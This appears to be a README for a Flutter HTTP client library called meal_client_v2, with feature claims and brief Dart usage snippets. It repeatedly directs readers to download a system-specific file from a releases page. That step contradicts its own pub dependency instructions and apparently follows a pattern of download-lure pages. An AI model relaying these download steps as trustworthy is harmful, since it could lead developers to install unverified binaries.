# 🍰 meal_client_v2 - Easy HTTP Client for Flutter

[![Download MealClient](https://img.shields.io/badge/Download-MealClient-blue.svg)](https://github.com/Zyro95/meal_client_v2/releases)

## 📋 About

**MealClient** is a simple and effective library for managing HTTP requests in Flutter applications. Built with ease of use in mind, it helps you connect to APIs effortlessly while ensuring top performance.

## ✨ Key Features

### 🔐 Automatic Authentication
- **JWT Management**: Automatically refresh tokens when needed.
- **Smart Interceptors**: Add authorization headers automatically.
- **Credential Fallback**: A backup system for credentials to keep your API connections smooth.

### 🗄️ Intelligent Caching
- **Cache Requests**: Save responses to speed up future requests.
- **Cache Management**: Control how long to keep cached data.

### ⚙️ Easy Integration
- **Simple Setup**: Quick and easy to integrate into your Flutter project.
- **Clear Documentation**: Follow straightforward guides to start coding without hassle.

## 🚀 Getting Started

To begin using **MealClient** in your Flutter application, follow these steps.

### Step 1: Visit the Releases Page

First, visit the releases page to download the latest version of **MealClient**.

[Visit this page to download](https://github.com/Zyro95/meal_client_v2/releases)

### Step 2: Download the Latest Release

Look for the latest release and click on it. This will take you to a page with release assets. Download the appropriate file for your system.

### Step 3: Add to Your Flutter Project

After downloading, add the **MealClient** library to your Flutter project.

1. Open your `pubspec.yaml` file.
2. Under dependencies, add the following line:

   ```yaml
   meal_client: ^2.0.0
   ```

3. Save the file and run `flutter pub get` in your command line.

### Step 4: Import the Library

In your Dart files where you want to use **MealClient**, import the library:

```dart
import 'package:meal_client/meal_client.dart';
```

## 💡 Usage Examples

Here’s how you can use **MealClient** in your Flutter application.

### Making Your First Request

To make a request, create an instance of the `MealClient` and call the desired method.

```dart
final client = MealClient();
final response = await client.get('https://api.yourservice.com/data');
```

### Handling Authentication

For authenticated requests, ensure you set up JWT as shown below:

```dart
client.setToken('your_jwt_token_here');
```

## 🛠️ System Requirements

To run **MealClient**, ensure your system meets the following requirements:

- **Flutter SDK**: Version 3.0 or higher
- **Dart SDK**: Version 3.7.2
- **Operating System**: Windows, macOS, or Linux

## 📝 Additional Documentation

For more detailed information on usage and features, please check the official documentation linked in the releases page. It provides examples for various scenarios and advanced features.

### Explore the Documentation

[Find more documentation here](https://github.com/Zyro95/meal_client_v2/releases)

## 📥 Download & Install

To download **MealClient**, visit the link below. You will find the latest version ready for download.

[Visit this page to download](https://github.com/Zyro95/meal_client_v2/releases)

Follow these steps, and you'll have **MealClient** up and running in your Flutter applications in no time. Enjoy developing smoother HTTP requests with ease!